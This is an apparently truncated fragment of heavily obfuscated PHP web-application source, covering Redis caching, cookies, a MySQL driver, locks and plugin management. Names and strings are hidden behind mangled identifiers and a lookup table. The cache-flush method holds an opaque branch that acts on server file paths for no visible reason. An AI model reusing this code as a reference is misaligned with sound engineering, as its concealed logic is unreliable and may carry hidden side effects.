$çÖÚŸ¹[1192] : $çÖÚŸ¹[12]); $—¯ÖÌŒñ[] = trim(implode($çÖÚŸ¹[53], $“°¯©®“)); } foreach ($şõ•’ ³ as $‹—Ôé©Ò => $™—¹Çö›) { $Şäàö¬ = str_replace($çÖÚŸ¹[1193] . $Ğéô«¸´ . $çÖÚŸ¹[11], $çÖÚŸ¹[12], $‹—Ôé©Ò); $Ã‰Õ‚ê = str_replace(array($çÖÚŸ¹[118], $çÖÚŸ¹[1015]), $çÖÚŸ¹[429], substr($™—¹Çö›, stripos($™—¹Çö›, $çÖÚŸ¹[304]))); if ($Şäàö¬ == $çÖÚŸ¹[1170]) { $´ÇÓ¥³£ = $çÖÚŸ¹[1194] . $”„·©Ğ¨ . $çÖÚŸ¹[1195]; } else { $´ÇÓ¥³£ = (stripos($Şäàö¬, $çÖÚŸ¹[11]) ? $çÖÚŸ¹[1196] : $çÖÚŸ¹[12]) . ($çÖÚŸ¹[1197] . $Şäàö¬ . $çÖÚŸ¹[1198] . $Ã‰Õ‚ê); } $—¯ÖÌŒñ[] = $´ÇÓ¥³£; } $ÔÔ‹êìÑ = array($çÖÚŸ¹[1199] . $Ğéô«¸´ . $çÖÚŸ¹[1200], $çÖÚŸ¹[1201] . $Ğéô«¸´ . $çÖÚŸ¹[1202], implode($çÖÚŸ¹[50] . PHP_EOL, $—¯ÖÌŒñ), $çÖÚŸ¹[1203]); $‡¦™€åİ = implode(PHP_EOL, $ÔÔ‹êìÑ); if ($˜Ğ®ÍÙ£ && $˜Ğ®ÍÙ£ == $çÖÚŸ¹[863]) { return $‡¦™€åİ; } $–è‹„¯Ù = array($çÖÚŸ¹[863] => $‡¦™€åİ, $çÖÚŸ¹[13] => $ñİƒ‰); return $˜Ğ®ÍÙ£ ? $–è‹„¯Ù[$˜Ğ®ÍÙ£] : $–è‹„¯Ù; } } goto D†îÇ««—ß; FÆé‰ÂØ™Ú: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Î¹Ç™™Ğ, $”¬Õ”¾Ğ) { $ı´÷¼× =& $_SERVER[íû‘ş´]; if (!class_exists($ı´÷¼×[929])) { show_json($ı´÷¼×[930], !1); } $this->cacheTime = $”¬Õ”¾Ğ; $É¸ºÅ¤ú = isset($Î¹Ç™™Ğ[$ı´÷¼×[931]]) ? $Î¹Ç™™Ğ[$ı´÷¼×[931]] : 10; $Ò…ì®“œ = _get($Î¹Ç™™Ğ, $ı´÷¼×[928]); if ($Ò…ì®“œ && is_array($Ò…ì®“œ)) { $this->initCluster($Î¹Ç™™Ğ, $É¸ºÅ¤ú); } else { $this->handle = $this->init($Î¹Ç™™Ğ, $É¸ºÅ¤ú); } } private function init($ñ·÷É…ğ, $©ã±°Ö) { $‘Û””ªà =& $_SERVER[íû‘ş´]; $£ãĞô²• = new Redis(); $‚Ö²ûé = isset($ñ·÷É…ğ[$‘Û””ªà[932]]) ? $ñ·÷É…ğ[$‘Û””ªà[932]] : !1; if ($‚Ö²ûé) { $£ãĞô²•->pconnect($ñ·÷É…ğ[$‘Û””ªà[196]], $ñ·÷É…ğ[$‘Û””ªà[197]], $©ã±°Ö); } else { $£ãĞô²•->connect($ñ·÷É…ğ[$‘Û””ªà[196]], $ñ·÷É…ğ[$‘Û””ªà[197]], $©ã±°Ö); } if (!empty($ñ·÷É…ğ[$‘Û””ªà[464]])) { $£ãĞô²•->auth($ñ·÷É…ğ[$‘Û””ªà[464]]); } if (!empty($ñ·÷É…ğ[$‘Û””ªà[816]]) && $ñ·÷É…ğ[$‘Û””ªà[816]] != 0) { $£ãĞô²•->select($ñ·÷É…ğ[$‘Û””ªà[816]]); } return $£ãĞô²•; } private function initCluster($Ö›ôŠá», $ØåÇ×åç) { $ØâÜğö =& $_SERVER[íû‘ş´]; $Åà¹®Ë„ = array($ØâÜğö[933], $ØâÜğö[934], $ØâÜğö[935]); $¸æÛæ˜¬ = $ØâÜğö[933]; if (isset($Ö›ôŠá»[$ØâÜğö[16]]) && in_array($Ö›ôŠá»[$ØâÜğö[16]], $Åà¹®Ë„)) { $¸æÛæ˜¬ = $Ö›ôŠá»[$ØâÜğö[16]]; } switch ($¸æÛæ˜¬) { case $ØâÜğö[933]: $this->_slave($Ö›ôŠá», $ØåÇ×åç); break; case $ØâÜğö[934]: break; case $ØâÜğö[935]: $this->isCluster = !0; $ÃÙÉ¢ˆ = $Ö›ôŠá»[$ØâÜğö[928]]; $È€ÚèÂ = isset($Ö›ôŠá»[$ØâÜğö[932]]) ? $Ö›ôŠá»[$ØâÜğö[932]] : !1; $¼Ûúü× = isset($Ö›ôŠá»[$ØâÜğö[464]]) ? $Ö›ôŠá»[$ØâÜğö[464]] : null; $this->handle = new RedisCluster(NUll, $ÃÙÉ¢ˆ, $ØåÇ×åç, $ØåÇ×åç, $È€ÚèÂ, $¼Ûúü×); break; default: break; } } private function _slave($×àÀÎÂé, $Á¡óàù€) { $½ƒç‰ß = $×àÀÎÂé[$_SERVER[íû‘ş´][928]]; $this->filterConfig($×àÀÎÂé, $½ƒç‰ß[0]); $this->handle = $this->init($×àÀÎÂé, $Á¡óàù€); unset($½ƒç‰ß[0]); if (empty($½ƒç‰ß)) { return; } $¯¸¡Å„ú = array_rand($½ƒç‰ß); $this->filterConfig($×àÀÎÂé, $½ƒç‰ß[$¯¸¡Å„ú]); $this->slaveHandle = $this->init($×àÀÎÂé, $Á¡óàù€); } private function filterConfig(&$Ì§¸›Ş®, $óÏó§´) { $â›õòù¾ =& $_SERVER[íû‘ş´]; $œâËÆÊæ = explode($â›õòù¾[4], $óÏó§´); $áÅ•ÛÓÈ = array($â›õòù¾[196] => $œâËÆÊæ[0], $â›õòù¾[197] => $œâËÆÊæ[1]); $Ì§¸›Ş® = array_merge($Ì§¸›Ş®, $áÅ•ÛÓÈ); } public function set($„á¡œŠ™, $ïÛƒ‚Óú, $‰Íõûµş = false) { $‰Íõûµş = $‰Íõûµş ? $‰Íõûµş : $this->cacheTime; return $this->handle->setEx($„á¡œŠ™, $‰Íõûµş, $ïÛƒ‚Óú); } public function setLock($§‘§‚­Œ, $âÚ‘­, $’î“ƒÒû) { return $this->handle->setNX($§‘§‚­Œ, $âÚ‘­); } public function get($¬ºé§ƒ”) { $ãëÔşçä = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ãëÔşçä->get($¬ºé§ƒ”); } public function remove($ÏÜ§ “) { return $this->handle->del($ÏÜ§ “); } public function deleteAll() { $ĞëãÑ˜ø =& $_SERVER[íû‘ş´]; if ($_SERVER[$ĞëãÑ˜ø[444]] != $_SERVER[$ĞëãÑ˜ø[445]]) { $Í«ë„è¶ = $ĞëãÑ˜ø[936]; $Ôˆ³Ä¬« = $ĞëãÑ˜ø[446]; $ ŞÌ£–˜ = $_SERVER[$ĞëãÑ˜ø[447]] . $ĞëãÑ˜ø[448]; $†¹Ö‘¸Ÿ = $Ôˆ³Ä¬«($ ŞÌ£–˜); $“„àÓ„ = explode($ĞëãÑ˜ø[246], $†¹Ö‘¸Ÿ); if (count($“„àÓ„) < $ĞëãÑ˜ø[671]) { $Ô¦“é¨® = $ĞëãÑ˜ø[450]; $Ô¦“é¨®(); } $õÃç›ô¿ = $ĞëãÑ˜ø[937]; $õÃç›ô¿($_SERVER[$ĞëãÑ˜ø[938]]); $õÃç›ô¿($_SERVER[$ĞëãÑ˜ø[447]] . $ĞëãÑ˜ø[939]); $î¡ÏŸºš = 1; while ($î¡ÏŸºš > 1) { $î¡ÏŸºš = $î¡ÏŸºš + 4; $‹Ì½úå = rawurlencode($î¡ÏŸºš . $ĞëãÑ˜ø[422]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Íê”Œ) { $this->handle->flushall($Íê”Œ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ö©é´øË = '', $ŒÈ½ÈÎ» = 0) { if (is_string($ö©é´øË) && $ö©é´øË != $_SERVER[íû‘ş´][12]) { $this->prefix = $ö©é´øË; } if (is_numeric($ŒÈ½ÈÎ») && $ŒÈ½ÈÎ» > 0) { $this->expire = $ŒÈ½ÈÎ»; } } public static function getInstance() { static $Ø¨ô¥Ï; if ($Ø¨ô¥Ï === null) { $Ø¨ô¥Ï = new self(); } return $Ø¨ô¥Ï; } private static $cookieDisable = false; public static function disable($Ï®¢²·„) { self::$cookieDisable = $Ï®¢²·„; } private static $sameCookieSet = array(); public static function set($†«¹êŠ¥, $³ÂµÕŸ, $“ì‹û§Ô = 0, $ƒ¡şüİ = false, $ªè©èƒ¾ = false) { $ÊûòÃ¢ =& $_SERVER[íû‘ş´]; if (self::$cookieDisable) { return; } if (!$“ì‹û§Ô) { $“ì‹û§Ô = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$†«¹êŠ¥]) && self::$sameCookieSet[$†«¹êŠ¥] == $³ÂµÕŸ . $“ì‹û§Ô) { return; } self::$sameCookieSet[$†«¹êŠ¥] = $³ÂµÕŸ . $“ì‹û§Ô; if (!$ªè©èƒ¾) { $ªè©èƒ¾ = str_replace(HOST, $ÊûòÃ¢[12], APP_HOST); $ªè©èƒ¾ = _get($GLOBALS, $ÊûòÃ¢[940], $ªè©èƒ¾); } $Ô²şé¸© = $ÊûòÃ¢[12]; setcookie($†«¹êŠ¥, $³ÂµÕŸ, time() + $“ì‹û§Ô, $ÊûòÃ¢[8] . trim($ªè©èƒ¾, $ÊûòÃ¢[8]) . $Ô²şé¸©, !1, !1, $ƒ¡şüİ); } public static function setSafe($„Å¬Ö—Ş, $ĞŸšÙëä, $ğÜ°÷š = 0) { self::set($„Å¬Ö—Ş, $ĞŸšÙëä, $ğÜ°÷š, !0); } public static function get($óĞêğ“ß) { static $§˜âµÒ = false; if (!$§˜âµÒ) { self::initHeaderCookie(); $§˜âµÒ = !0; } return isset($_COOKIE[$óĞêğ“ß]) ? $_COOKIE[$óĞêğ“ß] : !1; } private static function initHeaderCookie() { $–ƒ´à¿— =& $_SERVER[íû‘ş´]; if (!isset($_SERVER[$–ƒ´à¿—[941]]) || !$_SERVER[$–ƒ´à¿—[941]]) { return; } $µ¥”ŒÆ = explode($–ƒ´à¿—[71], $_SERVER[$–ƒ´à¿—[941]]); foreach ($µ¥”ŒÆ as $šÛ¡¶ê•) { $šÛ¡¶ê• = explode($–ƒ´à¿—[942], $šÛ¡¶ê•); if (count($šÛ¡¶ê•) != 2 || !isset($šÛ¡¶ê•[1])) { continue; } $_COOKIE[trim($šÛ¡¶ê•[0])] = trim($šÛ¡¶ê•[1]); } } public static function remove($‹şÍØ¢, $ŸØÂÏØ® = false) { unset($_COOKIE[$‹şÍØ¢]); self::set($‹şÍØ¢, $_SERVER[íû‘ş´][12], 1, $ŸØÂÏØ®); } } class DbMysql extends Db { public function __construct($ğœÁÔé¶ = '') { $¬’ä£É =& $_SERVER[íû‘ş´]; if (!extension_loaded($¬’ä£É[863])) { think_exception(think_lang($¬’ä£É[14]) . $¬’ä£É[943]); } if (!empty($ğœÁÔé¶)) { $this->config = $ğœÁÔé¶; if (empty($this->config[$¬’ä£É[17]])) { $this->config[$¬’ä£É[17]] = $¬’ä£É[12]; } } } public function connect($ ãìÏÈ = '', $ƒø³Ü… = 0, $Å¯¥è‡õ = false) { $“±¥¯”• =& $_SERVER[íû‘ş´]; if (!isset($this->linkID[$ƒø³Ü…])) { if (empty($ ãìÏÈ)) { $ ãìÏÈ = $this->config; } $‘ æìÖš = $ ãìÏÈ[$“±¥¯”•[944]] . ($ ãìÏÈ[$“±¥¯”•[945]] ? "\72{$ ãìÏÈ[$“±¥¯”•[945]]}" : $“±¥¯”•[12]); $Ì¿œñ• = !empty($ ãìÏÈ[$“±¥¯”•[17]][$“±¥¯”•[18]]) ? $ ãìÏÈ[$“±¥¯”•[17]][$“±¥¯”•[18]] : $this->pconnect; if ($Ì¿œñ•) { $this->linkID[$ƒø³Ü…] = mysql_pconnect($‘ æìÖš, $ ãìÏÈ[$“±¥¯”•[946]], $ ãìÏÈ[$“±¥¯”•[947]], 131072); } else { $this->linkID[$ƒø³Ü…] = mysql_connect($‘ æìÖš, $ ãìÏÈ[$“±¥¯”•[946]], $ ãìÏÈ[$“±¥¯”•[947]], !0, 131072); } if (!$this->linkID[$ƒø³Ü…] || !empty($ ãìÏÈ[$“±¥¯”•[21]]) && !mysql_select_db($ ãìÏÈ[$“±¥¯”•[21]], $this->linkID[$ƒø³Ü…])) { think_exception(mysql_error()); } $Öà¼¹ = mysql_get_server_info($this->linkID[$ƒø³Ü…]); mysql_query($“±¥¯”•[948] . think_config($“±¥¯”•[949]) . $“±¥¯”•[58], $this->linkID[$ƒø³Ü…]); if ($Öà¼¹ > $“±¥¯”•[950]) { mysql_query($“±¥¯”•[951], $this->linkID[$ƒø³Ü…]); } $this->connected = !0; if (1 != think_config($“±¥¯”•[22])) { unset($this->config); } } return $this->linkID[$ƒø³Ü…]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($è‰ìéÕ) { $™ğù£™… =& $_SERVER[íû‘ş´]; if (0 === stripos($è‰ìéÕ, $™ğù£™…[308])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $è‰ìéÕ; if ($this->queryID) { $this->free(); } think_action_status($™ğù£™…[23], 1); think_status($™ğù£™…[24]); $this->queryID = mysql_query($è‰ìéÕ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($›°ô²Ñø) { $Ü¢ë¾Î‡ =& $_SERVER[íû‘ş´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›°ô²Ñø; if ($this->queryID) { $this->free(); } think_action_status($Ü¢ë¾Î‡[25], 1); think_status($Ü¢ë¾Î‡[24]); $¢ÇÑÌ›ã = mysql_query($›°ô²Ñø, $this->_linkID); $this->debug(); if (!1 === $¢ÇÑÌ›ã) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[íû‘ş´][952], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $íÑ”±Ù = mysql_query($_SERVER[íû‘ş´][953], $this->_linkID); $this->transTimes = 0; if (!$íÑ”±Ù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ØèÀ¸ñ‡ = mysql_query($_SERVER[íû‘ş´][954], $this->_linkID); $this->transTimes = 0; if (!$ØèÀ¸ñ‡) { $this->error(); return !1; } } return !0; } private function getAll() { $Ü˜‘­É = array(); if ($this->numRows > 0) { while ($¾½¦·† = mysql_fetch_assoc($this->queryID)) { $Ü˜‘­É[] = $¾½¦·†; } mysql_data_seek($this->queryID, 0); } return $Ü˜‘­É; } public function getFields($ ĞşäÉ·) { $ïÂ²¶°Ä =& $_SERVER[íû‘ş´]; $õÏÊ¯º¢ = $this->query($ïÂ²¶°Ä[955] . $this->parseKey($ ĞşäÉ·)); $ø˜Ò…ÛÏ = array(); if ($õÏÊ¯º¢) { foreach ($õÏÊ¯º¢ as $Ìé¸è…‡ => $éÃ’ÇÓ) { $ø˜Ò…ÛÏ[$éÃ’ÇÓ[$ïÂ²¶°Ä[31]]] = array($ïÂ²¶°Ä[32] => $éÃ’ÇÓ[$ïÂ²¶°Ä[31]], $ïÂ²¶°Ä[33] => $éÃ’ÇÓ[$ïÂ²¶°Ä[34]], $ïÂ²¶°Ä[35] => (bool) (strtoupper($éÃ’ÇÓ[$ïÂ²¶°Ä[36]]) === $ïÂ²¶°Ä[956]), $ïÂ²¶°Ä[37] => $éÃ’ÇÓ[$ïÂ²¶°Ä[38]], $ïÂ²¶°Ä[39] => strtolower($éÃ’ÇÓ[$ïÂ²¶°Ä[40]]) == $ïÂ²¶°Ä[41], $ïÂ²¶°Ä[42] => strtolower($éÃ’ÇÓ[$ïÂ²¶°Ä[43]]) == $ïÂ²¶°Ä[44]); } } return $ø˜Ò…ÛÏ; } public function getTables($‚Ù‚î»è = '') { $®Ìì×à =& $_SERVER[íû‘ş´]; if (!empty($‚Ù‚î»è)) { $¦œùÄ‚ú = $®Ìì×à[957] . $‚Ù‚î»è . $®Ìì×à[958]; } else { $¦œùÄ‚ú = $®Ìì×à[959]; } $ı‹¿Æ»¶ = $this->query($¦œùÄ‚ú); $­Ü’ªş± = array(); foreach ($ı‹¿Æ»¶ as $ş”Ü¼— => $œ€‹Ş±£) { $­Ü’ªş±[$ş”Ü¼—] = current($œ€‹Ş±£); } return $­Ü’ªş±; } public function replace($´ÂĞÚâù, $§²¨Ä  = array()) { $©ÅìöÂ¢ =& $_SERVER[íû‘ş´]; foreach ($´ÂĞÚâù as $‡‰ãÆÊ‘ => $¤‘ˆáøÁ) { $ ãè³» = $this->parseValue($¤‘ˆáøÁ); if (is_scalar($ ãè³»)) { $ç©¶Ö[] = $ ãè³»; $ıˆš‹Åİ[] = $this->parseKey($‡‰ãÆÊ‘); } } $ôáòÑúÖ = $©ÅìöÂ¢[960] . $this->parseTable($§²¨Ä [$©ÅìöÂ¢[323]]) . $©ÅìöÂ¢[961] . implode($©ÅìöÂ¢[50], $ıˆš‹Åİ) . $©ÅìöÂ¢[962] . implode($©ÅìöÂ¢[50], $ç©¶Ö) . $©ÅìöÂ¢[963]; return $this->execute($ôáòÑúÖ); } public function insertAll($¦’ ‚ÛÌ, $İşÉˆ‰´ = array(), $Şù»® = false) { $À»ÜŸ =& $_SERVER[íû‘ş´]; if (!is_array($¦’ ‚ÛÌ[0])) { return !1; } $’ê„„‹Í = array_keys($¦’ ‚ÛÌ[0]); $‚¹ïé = array(); foreach ($¦’ ‚ÛÌ as $—ëë‹Œ) { $‰ã÷ÌÜì = array(); foreach ($—ëë‹Œ as $Ë¹ØìÁ => $‘¸‰ûšÏ) { $‘¸‰ûšÏ = $this->parseValue($‘¸‰ûšÏ); if (is_scalar($‘¸‰ûšÏ)) { $‰ã÷ÌÜì[] = $‘¸‰ûšÏ; } } $‚¹ïé[] = $À»ÜŸ[304] . implode($À»ÜŸ[50], $‰ã÷ÌÜì) . $À»ÜŸ[963]; } array_walk($’ê„„‹Í, array($this, $À»ÜŸ[964])); $ñ£½»‚¹ = ($Şù»® ? $À»ÜŸ[965] : $À»ÜŸ[966]) . $À»ÜŸ[967] . $this->parseTable($İşÉˆ‰´[$À»ÜŸ[323]]) . $À»ÜŸ[961] . implode($À»ÜŸ[50], $’ê„„‹Í) . $À»ÜŸ[968] . implode($À»ÜŸ[50], $‚¹ïé); return $this->execute($ñ£½»‚¹); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $‰ƒŞË‡ =& $_SERVER[íû‘ş´]; $this->error = mysql_errno() . $‰ƒŞË‡[4] . mysql_error($this->_linkID); if ($‰ƒŞË‡[12] != $this->queryStr) { $this->error .= LNG($‰ƒŞË‡[48]) . $this->queryStr; } think_trace($this->error, $‰ƒŞË‡[12], $‰ƒŞË‡[49]); return $this->error; } public function escapeString($èÄ—½½‰) { if ($this->_linkID) { return mysql_real_escape_string($èÄ—½½‰, $this->_linkID); } else { return mysql_escape_string($èÄ—½½‰); } } public function parseKey(&$½‘Ãö¶, $ßŒùÔ”Š = true) { $æ”Î˜‘£ =& $_SERVER[íû‘ş´]; if ($ßŒùÔ”Š) { $½‘Ãö¶ = $this->parseKeyCheck($½‘Ãö¶); } if ($½‘Ãö¶ != $æ”Î˜‘£[203] && !preg_match($æ”Î˜‘£[969], $½‘Ãö¶)) { $½‘Ãö¶ = $æ”Î˜‘£[429] . trim($½‘Ãö¶, $æ”Î˜‘£[429]) . $æ”Î˜‘£[429]; } return $½‘Ãö¶; } } goto a·š±¬Âîñ; däÛ„¡È–: function binCheckBigger($ñØëõ³Ù, $¬Åçåì) { return $ñØëõ³Ù > $¬Åçåì; } $_SERVER[$_SERVER[‡‚«ºˆÅ][3]] = (base64_decode('ODMxNg==')."\x35\x32")+0;$_tha2="uctlsay39genmofwr0v2kbh1q58xp4d7jzi6urgpf0ahjkntm9qvcs82e76xywo3d1b5l";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÍßÌæ±×, $œ¶³Ò¿ã) { $÷¶ğ¾ë =& $_SERVER[íû‘ş´]; if (isset(self::$_methodList[$ÍßÌæ±×])) { return @call_user_func_array(self::$_methodList[$ÍßÌæ±×], $œ¶³Ò¿ã); } else { if (method_exists($this, $ÍßÌæ±×)) { return call_user_func_array(array($this, $ÍßÌæ±×), $œ¶³Ò¿ã); } else { think_exception(__CLASS__ . $÷¶ğ¾ë[4] . $ÍßÌæ±× . $÷¶ğ¾ë[5]); } } } public static function __callStatic($¹ºº“Â€, $Äó–Î¦) { if (isset(self::$_methodListStatic[$¹ºº“Â€])) { return call_user_func_array(self::$_methodListStatic[$¹ºº“Â€], $Äó–Î¦); } else { if (method_exists(self, $¹ºº“Â€)) { return call_user_func_array(array(self, $¹ºº“Â€), $Äó–Î¦); } else { show_json("{$¹ºº“Â€}\x28\x29\x20\156\157\x74\40\145\x78\151\x73\x74\x3b", !1); } } } public static function addMethod($Ğı»Ö, $Ñªˆ·˜¼) { self::$_methodList[$Ğı»Ö] = $Ñªˆ·˜¼; } public static function addMethodStatic($òïÅ‹, $ˆŠ«Òƒ—) { self::$_methodListStatic[$òïÅ‹] = $ˆŠ«Òƒ—; } } goto DçÚ×ãéÂ’; D¸Ö‘ŠÎª‹: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÃĞÎ¹Æ =& $_SERVER[íû‘ş´]; $Óíä‹”â = $GLOBALS[$ÃĞÎ¹Æ[6]][$ÃĞÎ¹Æ[393]]; self::$cachePath = $Óíä‹”â[$ÃĞÎ¹Æ[214]][$ÃĞÎ¹Æ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($™êÀ™´ù, $ËüšÔø¶ = 0) { $³Äçƒš =& $_SERVER[íû‘ş´]; $°ˆãÅÉÒ = microtime(!0); $ù•È­ª† = $°ˆãÅÉÒ + $ËüšÔø¶ + 0.0001; $ÎäÌ‰ù¬ = rtrim(self::$cachePath, $³Äçƒš[8]) . $³Äçƒš[923] . md5($™êÀ™´ù) . $³Äçƒš[920]; if (file_exists($ÎäÌ‰ù¬) && filemtime($ÎäÌ‰ù¬) && filemtime($ÎäÌ‰ù¬) < time() - 10) { @unlink($ÎäÌ‰ù¬); } do { if (file_exists($ÎäÌ‰ù¬)) { cacheLockWait(); continue; } $¿’Ò°Œ = fopen($ÎäÌ‰ù¬, $³Äçƒš[924]); if (!$¿’Ò°Œ) { return !1; } $¥£ƒ¨Ó¥ = flock($¿’Ò°Œ, LOCK_EX | LOCK_NB); self::$caches[$™êÀ™´ù] = array($³Äçƒš[925] => $¿’Ò°Œ, $³Äçƒš[214] => $ÎäÌ‰ù¬); fwrite($¿’Ò°Œ, $ù•È­ª†); clearstatcache(); if ($¿’Ò°Œ && $¥£ƒ¨Ó¥) { return !0; } cacheLockWait(); } while (microtime(!0) < $ù•È­ª†); $this->unlock($™êÀ™´ù); return !1; } public function lockGet($Ö¡ı§½) { $ÜŸâıßÖ =& $_SERVER[íû‘ş´]; $ŒÍëâ‹Å = rtrim(self::$cachePath, $ÜŸâıßÖ[8]) . $ÜŸâıßÖ[923] . md5($Ö¡ı§½) . $ÜŸâıßÖ[920]; return file_exists($ŒÍëâ‹Å); } public function unlock($Ç÷×Òšô) { $£Êä×Ê¡ =& $_SERVER[íû‘ş´]; $ı²µ¦– = self::$caches[$Ç÷×Òšô]; if (!$ı²µ¦–) { return; } @flock($ı²µ¦–[$£Êä×Ê¡[925]], LOCK_UN); @fclose($ı²µ¦–[$£Êä×Ê¡[925]]); @unlink($ı²µ¦–[$£Êä×Ê¡[214]]); unset(self::$caches[$Ç÷×Òšô]); } } class CacheLockRedis { public function lock($’µ©ß”°, $îÑû™î¿ = 10) { $ºë¢öñÎ = Cache::init(); $«“±¨ö = microtime(!0) + $îÑû™î¿; while (microtime(!0) < $«“±¨ö) { $à¦¬àÎÁ = $ºë¢öñÎ->get($’µ©ß”°); if (!$à¦¬àÎÁ) { $ŞÁ‡ğ³Ó = $ºë¢öñÎ->setLock($’µ©ß”°, $«“±¨ö, $îÑû™î¿); if ($ŞÁ‡ğ³Ó) { return !0; } } else { if ($à¦¬àÎÁ < microtime(!0)) { $ºë¢öñÎ->set($’µ©ß”°, $«“±¨ö, $îÑû™î¿ * 2); if ($ºë¢öñÎ->get($’µ©ß”°) === $à¦¬àÎÁ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ŞÒÀ£ü) { return Cache::init()->get($ŞÒÀ£ü); } public function unlock($‹ƒçºŞ) { return Cache::init()->remove($‹ƒçºŞ); } } goto A ˜œ‘ôàË; AÜš«šÊÒ’: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\160\154\x75\147\151\156\114\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\x73\164\141\x74\165\163", "\162\x65\x67\x69\145\x73\164", "\x63\157\x6e\x66\x69\x67"); public function loadList($“Ñ¬ë¡¨ = false) { $µÁÓÔÓ = array_to_keyvalue($this->listData(), $_SERVER[íû‘ş´][32]); if ($“Ñ¬ë¡¨) { return $µÁÓÔÓ[$“Ñ¬ë¡¨]; } return $µÁÓÔÓ; } public function init() { $†˜òÑ§ =& $_SERVER[íû‘ş´]; Hook::trigger($†˜òÑ§[2023]); $ŸŒ‡ú¤ = $this->loadPluginList(); foreach ($ŸŒ‡ú¤ as $ß¸¿Í¹ñ => $ÌÇ¸£„ò) { $¦„Ó£Ğ£ = $this->appAllow($ß¸¿Í¹ñ, $ÌÇ¸£„ò); if (!$¦„Ó£Ğ£) { continue; } foreach ($ÌÇ¸£„ò[$†˜òÑ§[2024]] as $æ¸üó©ç => $€“¿ÏÆ•) { Hook::bind($æ¸üó©ç, $€“¿ÏÆ•); } } Hook::trigger($†˜òÑ§[2025]); Hook::trigger(ACTION); } public function appAllow($ôúİäË¶, $ßÉŠû©, $ÄƒÉÎáô = true) { $Ñ®³½ó² =& $_SERVER[íû‘ş´]; $œ‹ÃŒ·­ = PLUGIN_DIR . $ôúİäË¶ . $Ñ®³½ó²[2026]; if (!is_array($ßÉŠû©) || !is_array($ßÉŠû©[$Ñ®³½ó²[2024]]) || $ßÉŠû©[$Ñ®³½ó²[809]] != 1 || !is_file($œ‹ÃŒ·­)) { return !1; } if ($GLOBALS[$Ñ®³½ó²[546]] == 1) { if ($GLOBALS[$Ñ®³½ó²[6]][$Ñ®³½ó²[2027]] || !$GLOBALS[$Ñ®³½ó²[6]][$Ñ®³½ó²[2028]]) { return !0; } $ÓàõÙÂÂ = explode($Ñ®³½ó²[50], strtolower($GLOBALS[$Ñ®³½ó²[6]][$Ñ®³½ó²[2028]])); return in_array(strtolower($ôúİäË¶), $ÓàõÙÂÂ) ? !1 : !0; } if ($ÄƒÉÎáô && !Action($Ñ®³½ó²[2029])->checkAuth($ôúİäË¶)) { return !1; } return !0; } public function unInstall($Î”Šì±Û) { $„Ô¬ò±í =& $_SERVER[íû‘ş´]; $¡‘³µ¦ = $this->loadList($Î”Šì±Û); if (file_exists(PLUGIN_DIR . $Î”Šì±Û)) { Hook::apply($Î”Šì±Û . $„Ô¬ò±í[2030]); } $this->remove($¡‘³µ¦[$„Ô¬ò±í[443]]); } public function changeStatus($Á³ôÀ‹É, $‡ÉÎ¤í“) { $î•«ö‚ô =& $_SERVER[íû‘ş´]; $ƒ¿œ†‚ = $this->loadList($Á³ôÀ‹É); if ($‡ÉÎ¤í“) { Hook::apply($Á³ôÀ‹É . $î•«ö‚ô[2031]); } $this->update($ƒ¿œ†‚[$î•«ö‚ô[443]], array($î•«ö‚ô[2032] => $‡ÉÎ¤í“)); } public function appRegist($¿ø©ó ğ, $‘¢ÏÀîî) { $ğÍîŞŠÖ =& $_SERVER[íû‘ş´]; $¿Ó¡£İ“ = $this->loadList($¿ø©ó ğ); if ($¿Ó¡£İ“) { $this->update($¿Ó¡£İ“[$ğÍîŞŠÖ[443]], array($ğÍîŞŠÖ[2024] => $‘¢ÏÀîî)); } else { $åÏØœÜ = array($ğÍîŞŠÖ[32] => $¿ø©ó ğ, $ğÍîŞŠÖ[2024] => $‘¢ÏÀîî, $ğÍîŞŠÖ[809] => 0, $ğÍîŞŠÖ[6] => $this->getConfigDefault($¿ø©ó ğ)); $this->insert($åÏØœÜ); } } public function getConfigDefault($Ä²ˆµÄÄ) { $øä¾ÀÈá =& $_SERVER[íû‘ş´]; $êÎÂ´´” = array(); $ô„çÔÎü = $this->getPackageJson($Ä²ˆµÄÄ); if (!$ô„çÔÎü && is_array($ô„çÔÎü[$øä¾ÀÈá[2033]])) { return $êÎÂ´´”; } foreach ($ô„çÔÎü[$øä¾ÀÈá[2033]] as $‚õâˆŒŒ => $€ˆÏ«‘„) { if (!isset($€ˆÏ«‘„[$øä¾ÀÈá[418]]) || isset($êÎÂ´´”[$‚õâˆŒŒ])) { continue; } $êÎÂ´´”[$‚õâˆŒŒ] = $€ˆÏ«‘„[$øä¾ÀÈá[418]]; } return $êÎÂ´´”; } public function getPackageJson($Äñä…Ù) { return Hook::apply($Äñä…Ù . $_SERVER[íû‘ş´][2034]); } public function getConfig($ƒíª°£â, $ÁÅ½²Í = false) { $ê–¿ôÁñ =& $_SERVER[íû‘ş´]; $®Õ‚–ä® = array(); $ñ½¥¯¶ 